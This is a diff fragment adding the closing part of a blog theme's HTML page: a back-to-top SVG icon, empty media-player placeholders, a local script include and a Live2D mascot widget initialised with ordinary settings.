+    <svg class="icon icon-back-to-top" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg">
+      <path d="M725.333333 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8l-213.333333-213.333333c-17.066667-17.066667-17.066667-42.666667 0-59.733333s42.666667-17.066667 59.733333 0l213.333333 213.333333c17.066667 17.066667 17.066667 42.666667 0 59.733333C746.666667 422.4 738.133333 426.666667 725.333333 426.666667z"></path>
+      <path d="M298.666667 426.666667c-12.8 0-21.333333-4.266667-29.866667-12.8-17.066667-17.066667-17.066667-42.666667 0-59.733333l213.333333-213.333333c17.066667-17.066667 42.666667-17.066667 59.733333 0s17.066667 42.666667 0 59.733333l-213.333333 213.333333C320 422.4 311.466667 426.666667 298.666667 426.666667z"></path>
+      <path d="M512 896c-25.6 0-42.666667-17.066667-42.666667-42.666667L469.333333 170.666667c0-25.6 17.066667-42.666667 42.666667-42.666667s42.666667 17.066667 42.666667 42.666667l0 682.666667C554.666667 878.933333 537.6 896 512 896z"></path>
+    </svg>
+  </div>
+
+  
+  <!-- aplayer -->
+
+
+<!-- dplayer -->
+
+
+
+
+  
+
+
+  
+
+
+  
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+  
+  <!-- 尾部用户自定义相关内容 -->
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
